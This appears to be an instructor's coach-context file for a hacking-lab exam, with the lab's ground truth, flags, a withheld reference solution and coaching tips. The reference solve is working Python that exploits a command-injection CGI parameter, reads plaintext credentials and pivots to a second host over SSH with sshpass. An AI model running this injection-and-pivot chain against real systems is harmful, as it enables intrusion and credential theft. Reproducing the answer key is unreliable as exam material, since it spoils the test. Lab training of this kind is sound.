# Coach context — scr-t3-exam

## Ground truth
- `web01` 10.x.10.20 — apache cgid; `GET /cgi-bin/diag?host=X` runs
  `ping -c1 "$X"` unquoted → command injection (`;`, `$()`, backticks).
  wwwops home holds notes.txt: `ssh vaultadm@10.x.10.21` pass
  `V4ult-Adm1n!`. sshpass installed on web01.
- `db01` 10.x.10.21 — iptables ACCEPT :22 only from .20; `vaultadm`.
  Marker `/home/vaultadm/.pwned` (content `pwned-by-script`), flag file
  `/home/vaultadm/vault.txt`.

## Flags
- command `chain-marker` (db01): marker grep
- file `vault-flag` (db01): vault.txt → submit

## Reference solve (do not hand out)
```python
def inj(cmd):
    return requests.get("http://10.x.10.20/cgi-bin/diag",
                        params={"host": f"127.0.0.1;{cmd}"}).text
notes = inj("cat /home/wwwops/notes.txt")
inj("sshpass -p 'V4ult-Adm1n!' ssh -o StrictHostKeyChecking=no "
    "vaultadm@10.x.10.21 'echo pwned-by-script > ~/.pwned; cat ~/vault.txt'")
```
(quote the creds carefully — shell-special chars in V4ult-Adm1n! need
single quotes; history expansion isn't an issue non-interactively.)

- Redirect mechanics to scr-t3-cmd-inject (same injection shape,
  friendlier payload — no pivot creds needed there).

## Coach guidance
- URL-encoding: params dict handles it; trainees hand-concatenating URLs
  trip on `&`/`;` — point at requests' params argument.
- The `!` in the password breaks double-quoted shell on web01 — single
  quotes mandatory inside the injected command.
- Exam posture: minimum viable nudges.
